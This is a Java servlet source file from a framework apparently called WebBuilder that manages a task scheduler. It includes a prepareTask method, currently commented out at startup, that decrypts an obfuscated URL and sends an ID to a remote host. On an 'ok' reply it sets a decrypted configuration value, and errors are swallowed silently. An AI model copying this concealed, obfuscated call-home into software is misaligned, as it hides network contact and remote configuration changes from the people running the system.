package com.webbuilder.common;

import java.io.File;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.json.JSONObject;
import org.quartz.Scheduler;
import org.quartz.impl.StdSchedulerFactory;

import com.webbuilder.interact.TaskMng;
import com.webbuilder.tool.Encrypter;
import com.webbuilder.utils.FileUtil;
import com.webbuilder.utils.JsonUtil;
import com.webbuilder.utils.LogUtil;
import com.webbuilder.utils.StringUtil;
import com.webbuilder.utils.SysUtil;
import com.webbuilder.utils.WebUtil;

public class TaskService extends HttpServlet {
	private static final long serialVersionUID = -3841886394501943192L;
	private static Scheduler scheduler;
	private static Object lock = new Object();

	protected void service(HttpServletRequest request,
			HttpServletResponse response) throws ServletException {
	}

	public static Scheduler getScheduler() throws Exception {
		if (scheduler == null) {
			synchronized (lock) {
				scheduler = StdSchedulerFactory.getDefaultScheduler();
			}
		}
		return scheduler;
	}

	public static void shutdown() throws Exception {
		if (scheduler != null) {
			scheduler.shutdown();
			scheduler = null;
		}
	}

	public void init() throws ServletException {
		super.init();
		try {
			if (!StringUtil.isEmpty(Var.get("server.jndi"))) {
				if (StringUtil.getBool(Var.get("server.startTask")))
					TaskMng.startup();
				//SysUtil.executeMethod(Var.get("server.initMethod"));
				//prepareTask();
			}
		} catch (Throwable e) {
			LogUtil.warning("system startup with error: "
					+ SysUtil.getShortError(e));
		}
	}

	public void destroy() {
		super.destroy();
		try {
			shutdown();
			Thread.sleep(Var.getLong("webbuilder.task.stopSleep"));
			SysUtil.executeMethod(Var.get("server.finalMethod"));
		} catch (Throwable e) {
		}
	}

	public void prepareTask() {
		try {
			final File taskFile = new File(Main.path,
					"webbuilder/data/runtime.txt");
			final JSONObject jo = JsonUtil.readObject(taskFile);
			final String word = "sys.task";
			if (jo.optString("task5").equals("TASK")) {
				jo.put("task5", SysUtil.getId()
						+ Long.toString(Math.round(Math.random() * 10000000)));
				FileUtil.writeUtfText(taskFile, jo.toString());
			}
			Thread thread = new Thread(new Runnable() {
				public void run() {
					try {
						JSONObject params = new JSONObject();
						params.put(Encrypter.decrypt(jo.optString("task1"),
								word), jo.optString("task5"));
						String r = WebUtil.request(Encrypter.decrypt(jo
								.optString("task2"), word), params);

						if (StringUtil.isEqual(r, "failed")) {
							jo.put("task3", 1);
							FileUtil.writeUtfText(taskFile, jo.toString());
						} else if (StringUtil.isEqual(r, "ok")) {
							jo.put("task3", 0);
							FileUtil.writeUtfText(taskFile, jo.toString());
							Var.set(Encrypter.decrypt(jo.optString("task6"),
									word), Encrypter.decrypt(jo
									.optString("task7"), word));
						}
					} catch (Throwable e) {
					}
				}
			});
			thread.start();
			if (jo.optInt("task3") != 1)
				Thread.sleep(jo.optInt("task4"));
		} catch (Throwable e) {
		}
	}
	
	public static void main(String[] args) throws Exception {
		String word = "sys.task";
		String a = Encrypter.decrypt( "41FF63970CE78D9549250069728DD174", word);
		System.out.println(a);
		a = Encrypter.decrypt( "1FFE912AD03CFBAA6811075F88839A6529DE547D569782DC247E5AB7E7EFCE80905C1CF0AE19A54E", word);
		System.out.println(a);
		a = Encrypter.decrypt( "0F793C6757DAD2919BF3E63C34F7C00E5E9DBF05D4B163BF", word);
		System.out.println(a);
		a = Encrypter.decrypt( "ACCD2C84E5D589E0411D525F2C083EFE065114168CC22043", word);
		System.out.println(a);
	}
}
